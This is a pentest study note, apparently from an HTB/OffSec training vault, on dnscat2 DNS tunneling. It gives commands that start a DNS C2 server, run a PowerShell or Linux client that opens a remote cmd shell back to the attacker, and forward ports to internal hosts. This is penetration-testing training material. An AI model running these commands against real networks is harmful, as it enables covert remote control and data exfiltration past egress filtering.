# Dnscat2

DNS-tunneled C2 and port-forwarding tool. Wraps arbitrary TCP data inside DNS queries and responses, allowing C2 traffic to traverse environments where only port 53 (DNS) outbound is permitted. Two components: a Ruby server on Kali, a PowerShell client module for Windows targets.

Cross-links: [[Pivoting, Tunneling, and Port Forwarding (HTB Supplementary)#PT.4 Dnscat2|PT.4]], [[Port Redirection and SSH Tunneling (Command Appendix)#Dnscat2 (DNS Tunneling)|Command Appendix]]

---

## What problem it solves

In environments with extremely restrictive egress filtering (HTTP blocked, SSH blocked, only DNS queries allowed out), DNS tunneling lets you exfiltrate data and send commands by encoding them into DNS query names and reading the C2 responses from DNS answers. Requires either a domain you control or a lab DNS setup pointing queries to your server.

## Install

```bash
# Server (Kali):
sudo gem install dnscat2    # or clone from GitHub
# https://github.com/iagox86/dnscat2

# Client (Windows target):
# PowerShell module: dnscat2-powershell
# https://github.com/lukebaggett/dnscat2-powershell
# Upload dnscat2.ps1 to the Windows target
```

## Usage

```bash
# On Kali: start the server
# --dns: bind/listen params for the DNS server
# --no-cache: required to prevent stale session issues (always include)
sudo ruby dnscat2.rb --dns "host=0.0.0.0,port=53,domain=<your-domain>" --no-cache

# On the Windows target (PowerShell):
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver <KALI_IP> -Domain <your-domain> -PreSharedSecret <secret> -Exec cmd

# Back in the dnscat2 server console:
# List sessions:
windows
# or: window (synonymous in some versions)

# Interact with a session:
window -i <N>
```

The `window -i N` command gives you an interactive shell session over the DNS tunnel. It's very slow (DNS is chatty and rate-limited) but functional.

## Caveats

- **Very slow.** DNS has inherent latency and query-rate limits. A `whoami` can take several seconds to return. Not suitable for interactive shell work beyond basic commands.
- Requires port 53 UDP accessible from Kali (needs `sudo` for privileged port binding).
- The `--no-cache` flag is non-optional: without it the server caches DNS responses and sessions break.
- `Start-Dnscat2` with `-Exec cmd` spawns cmd.exe. Use `-Exec powershell` if you need PS-specific features.
- Real-world DNS tunneling requires a domain with an NS record pointing to your server IP. In an HTB/lab context this is usually simplified or pre-configured.

## Linux Client (Binary, Not PowerShell)

For Linux pivot hosts, dnscat2 ships a compiled binary (pre-installed on Offsec lab machines at `~/dnscat/dnscat`). Usage is simpler than the PowerShell module:

```bash
# Basic (uses system DNS resolver — may cause session drops via systemd-resolved caching):
./dnscat feline.corp

# Stable (bypass systemd-resolved, query resolver directly):
./dnscat --dns server=<resolver-ip>,port=53,domain=feline.corp --secret=<secret>
# NOTE: domain= goes INSIDE --dns (comma-separated). Passing it as a positional arg
# alongside --dns server= causes: "It looks like you used --dns and also passed a domain"
```

## Port Forwarding Through DNS Tunnel

The `listen` command inside a dnscat2 command session works like `ssh -L`:

```bash
dnscat2> window -i 1    # attach to session -- do this FAST (drops after ~20 failed DNS queries)
command (host) 1> listen [lhost:]lport rhost:rport

# Example: bind 4455 on FELINEAUTHORITY loopback, forward to HRSHARES SMB:
command (host) 1> listen 127.0.0.1:4455 172.16.2.11:445

# Example: bind 4141 on ALL interfaces (so Kali can connect from outside):
command (host) 1> listen 0.0.0.0:4141 172.16.249.217:4646
```

**When the tool hardcodes 127.0.0.1:** bind on `0.0.0.0` on FELINEAUTHORITY, then use an SSH local port forward to bring that port to Kali's loopback:
```bash
ssh -fNL 4141:127.0.0.1:4141 kali@<felineauthority-ip>
# -fN = fork to background, no shell. Kali's 127.0.0.1:4141 now routes to dnscat2 listen.
```

## Session Stability Caveats

- **20-attempt timeout:** client drops after ~20 consecutive DNS queries with no valid server response. Act immediately when the session connects, `window -i 1` then `listen` in one go.
- **Systemd-resolved caching** on Ubuntu pivots can cause stale responses. Use `--dns server=<resolver>,port=53,domain=<domain>` to bypass the local stub resolver.
- **Multiple terminals:** keep the dnscat2 server terminal and the pivot SSH terminal completely separate. Typing pivot commands into the dnscat2 server prompt silently sends them as dnscat2 commands (which fail with "Unknown command").
- Sessions are slow by nature. After `listen`, wait up to 60 seconds for data to flow through before concluding it's broken.

Cross-link: [[Tunneling Through Deep Packet Inspection#20.2.2 DNS Tunneling with dnscat2]]

## vs other tunneling tools

| Tool | Protocol | Client language | Speed | Auth required |
|---|---|---|---|---|
| Dnscat2 | DNS (UDP 53) | PowerShell (PS1) | Very slow | Pre-shared secret |
| Rpivot | HTTP (TCP 80) | Python 2.7 | Moderate | None |
| Chisel | HTTP (TCP any) | Go binary | Fast | Optional |
| ptunnel-ng | ICMP | C binary (static) | Moderate | Root both sides |

#### Tags: #ModernTooling #Dnscat2 #Pivoting #DNSTunnel #C2 #DPI #Module20 #HTBSupplementary
